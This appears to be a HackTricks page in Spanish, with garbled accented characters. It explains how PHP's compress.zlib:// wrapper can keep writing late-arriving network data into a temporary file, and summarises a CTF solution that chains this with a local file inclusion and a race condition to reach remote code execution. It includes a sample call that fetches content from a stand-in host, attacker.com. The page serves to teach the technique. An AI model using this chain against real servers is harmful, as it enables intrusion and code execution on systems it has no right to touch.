<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- Â¿Trabajas en una **empresa de ciberseguridad**? Â¿Quieres ver tu **empresa anunciada en HackTricks**? Â¿O quieres tener acceso a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Â¡Consulta los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)

- Consigue el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Ãšnete al** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sÃ­gueme** en **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


## `compress.zlib://` y `PHP_STREAM_PREFER_STDIO`

Un archivo abierto utilizando el protocolo `compress.zlib://` con la bandera `PHP_STREAM_PREFER_STDIO` puede continuar escribiendo datos que llegan a la conexiÃ³n mÃ¡s tarde en el mismo archivo.

Esto significa que una llamada como:
```php
file_get_contents("compress.zlib://http://attacker.com/file")
```
Enviaremos una solicitud pidiendo http://attacker.com/file, luego el servidor podrÃ­a responder la solicitud con una respuesta HTTP vÃ¡lida, mantener la conexiÃ³n abierta y enviar datos adicionales algÃºn tiempo despuÃ©s que tambiÃ©n se escribirÃ¡n en el archivo.

Puede ver esa informaciÃ³n en esta parte del cÃ³digo php-src en main/streams/cast.c:
```c
/* Use a tmpfile and copy the old streams contents into it */

    if (flags & PHP_STREAM_PREFER_STDIO) {
        *newstream = php_stream_fopen_tmpfile();
    } else {
        *newstream = php_stream_temp_new();
    }
```
## CondiciÃ³n de Carrera a RCE

Este CTF se resolviÃ³ utilizando el truco anterior.

El atacante harÃ¡ que el servidor vÃ­ctima abra una conexiÃ³n leyendo un archivo desde el servidor del atacante utilizando el protocolo `compress.zlib`.

Mientras esta conexiÃ³n exista, el atacante exfiltrarÃ¡ la ruta al archivo temporal creado (que es filtrado por el servidor).

Mientras la conexiÃ³n siga abierta, el atacante explotarÃ¡ una LFI cargando el archivo temporal que controla.

Sin embargo, hay una comprobaciÃ³n en el servidor web que impide la carga de archivos que contienen `<?`. Por lo tanto, el atacante aprovecharÃ¡ una CondiciÃ³n de Carrera. En la conexiÃ³n que aÃºn estÃ¡ abierta, el atacante enviarÃ¡ la carga Ãºtil de PHP DESPUÃ‰S de que el servidor web haya comprobado si el archivo contiene los caracteres prohibidos, pero ANTES de que cargue su contenido.

Para obtener mÃ¡s informaciÃ³n, consulte la descripciÃ³n de la CondiciÃ³n de Carrera y el CTF en [https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer](https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer)
